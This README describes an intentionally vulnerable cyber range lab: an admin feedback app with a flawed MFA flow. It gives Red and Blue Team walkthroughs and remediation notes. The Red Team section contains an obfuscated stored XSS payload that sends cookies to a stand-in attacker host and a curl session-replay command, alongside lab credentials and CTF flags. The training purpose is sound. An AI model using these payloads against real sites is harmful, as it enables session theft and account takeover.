# SCENARIO75 — "Cookies Reuse & MFA Bypass"

A self-contained Red vs. Blue cyber range lab built around a corporate
**Admin Feedback System** with a flawed session-issuance flow: MFA is
enforced on the "official" login path, but `/dashboard` never actually
verifies that a client went through it. Combined with a readable
(`HttpOnly=false`) pre-auth cookie and a naive keyword-blocklist WAF, an
attacker can steal an admin session via stored XSS and replay it directly.

> ⚠️ **Intentionally vulnerable.** Deploy only inside an isolated lab VM /
> internal range network. Never expose to the public internet.

## 1. Architecture

```
scenario75-lab/
├── app/                  # Node.js/Express vulnerable application
│   ├── server.js         # Routes, session logic, the actual vulnerability
│   ├── waf.js             # Naive keyword-blocklist WAF middleware
│   ├── logger.js          # Real-time nginx-style access.log / error.log
│   └── package.json
├── Dockerfile
├── docker-compose.yml     # Publishes the app on :3075, binds ./logs -> /opt/admin/logs
├── scripts/
│   ├── provision_vm.sh    # Run on the Proxmox VM: Docker, SSH:2275, deploy
│   └── generate_logs.sh   # Seeds the canonical Blue Team incident timeline
└── logs/                  # Bind-mounted log volume (access.log, error.log)
```

- **Web app**: `http://<vm-ip>:3075`
- **SSH (Blue Team)**: port `2275`, user `analyst` / `blue_team_rocks`
  (provisioned at the VM/OS level — not inside the container — since SSH
  access is a host-level requirement)
- **Logs**: `/opt/admin/logs/{access.log,error.log}` on the VM host,
  bind-mounted into the container

## 2. Deployment (on a Proxmox VM)

1. Provision a Linux VM (Ubuntu 22.04/24.04 recommended) on Proxmox with
   internal network access (e.g. `feedback.admin.local`).
2. Copy this repository onto the VM.
3. Run the provisioning script as root:

   ```bash
   cd scenario75-lab
   sudo bash scripts/provision_vm.sh
   ```

   This installs Docker + Compose, creates the `analyst` SSH user on port
   `2275`, opens the firewall, builds/starts the app on port `3075`, and
   seeds the Blue Team logs automatically.

4. Alternatively, without the full VM provisioning (e.g. local testing):

   ```bash
   docker compose up -d --build
   bash scripts/generate_logs.sh
   ```

## 3. Red Team Walkthrough

**Phase 1 — Reconnaissance**
- `curl -i http://target:3075/` → `X-Powered-By: Node.js`, and a
  `pre_mfa_session=pending_mfa_verification` cookie (readable by JS —
  `HttpOnly=false`).
- View page source → ASCII-art comment hints at checking `robots.txt`.
- `curl http://target:3075/robots.txt` → discloses `/api/verify-mfa` and
  the restricted admin area `/dashboard`.

**Phase 2 — Defense Evasion (WAF bypass → stored XSS)**
- `POST /feedback` with a `<script>` payload → blocked, `403`.
- Bypass using an HTML5 event handler and bracket-notation obfuscation
  (the WAF only blocks the literal string `document.cookie`):

  ```json
  {
    "name": "attacker",
    "message": "<svg onload=\"fetch('http://attacker.local/collect?data='+window['docu'+'ment']['coo'+'kie'])\">"
  }
  ```

  This is accepted (`200`) and stored. When an admin later views
  `/dashboard`, the payload fires in their browser and exfiltrates their
  (HttpOnly=false) session cookie via `fetch`.

**Phase 3 — Initial Access (MFA bypass via session replay)**
- Take the stolen `adm_sess_*` cookie and present it directly:

  ```bash
  curl -H "Cookie: adm_sess_<stolen-value>=authenticated" http://target:3075/dashboard
  ```

- `/api/verify-mfa` is never called — the backend only checks that *some*
  cookie name starts with `adm_sess`. Full dashboard access is granted,
  the payload is reflected inside `<div class="xss-payload">`, and the
  final flag is embedded in the page:

  ```
  SCENARIO75{RED_C00k13_MFA_Byp4ss_0wn3d}
  ```

## 4. Blue Team Walkthrough

Logs live at `/opt/admin/logs/` (seeded automatically by
`scripts/generate_logs.sh`, and appended to live if the app is exercised
interactively).

1. **Baseline vs. attacker traffic**: legitimate admin activity comes from
   `192.168.1.100`; the intrusion originates from `10.10.14.50`
   (`10.10.14.0/24`), all with a consistent `Mozilla/5.0` User-Agent.
2. **First WAF alert**: `error.log`, `18:50:15`, a blocked `<script>`
   payload from the attacker IP.
3. **The bypass**: immediately after, a second `POST /feedback` from the
   same IP returns `200` — the WAF allowed an obfuscated `<svg onload=...>`
   payload through.
4. **Exfiltration**: an `access.log` entry carries an `X-Forwarded-For`
   header containing a 44-character Base64 string. Decoding it (Base64)
   surfaces a clue pointing to the Blue Team flag:

   ```
   SCENARIO75{BLUE_L0G_HUnt3r_M4st3r}
   ```

5. **Dashboard compromise**: `access.log`, `18:51:55` — a `200` on
   `/dashboard` from the attacker IP. Cross-referencing shows the attacker
   IP **never** hit `/api/verify-mfa` — proof the MFA step was skipped
   entirely via cookie replay.
6. **Incident confirmation**: `error.log` contains `CRITICAL`-level
   entries for the cookie-reuse/exfiltration event and, at `18:53:10`, the
   line:

   ```
   Authentication bypass anomaly
   ```

## 5. Root Cause & Remediation Notes

- Bind session cookies to device/origin (e.g. signed, short-lived tokens
  tied to IP/User-Agent fingerprint or a secondary proof-of-possession),
  not just presence of a cookie name pattern.
- Set `HttpOnly=true` (and `Secure`, `SameSite=Strict`) on **all**
  session-related cookies, including pre-auth ones.
- Replace the keyword-blocklist WAF with context-aware output encoding /
  a real allow-list-based sanitizer (e.g. DOMPurify server-side) — never
  trust a blocklist against arbitrary HTML.
- `/dashboard` must re-validate that MFA was completed for *this*
  session, not just that *some* admin-shaped cookie is present.
